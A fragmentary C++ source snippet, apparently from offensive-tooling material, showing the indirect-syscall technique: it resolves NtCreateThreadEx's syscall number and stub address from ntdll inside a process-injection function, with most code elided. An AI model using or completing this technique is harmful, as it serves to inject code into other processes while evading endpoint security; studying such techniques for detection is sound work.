...
/*
    g++ indirect_syscall.cpp indirect_syscall.o -o indirect_syscall.exe
*/

DWORD g_SSN_NtCreateThreadEx        = 0;
LPVOID g_SYSADDR_NtCreateThreadEx    = 0;
...
DWORD getInDirectSyscallStub(HMODULE hNTDLL, const char* NtFunctionName){
    ...
    g_SSN_NtCreateThreadEx = SSN;
    g_SYSADDR_NtCreateThreadEx = stub;
    return SSN;
}
...
int injectProc(int PID){
    ...
    getInDirectSyscallStub(hNtdll, "NtCreateThreadEx");
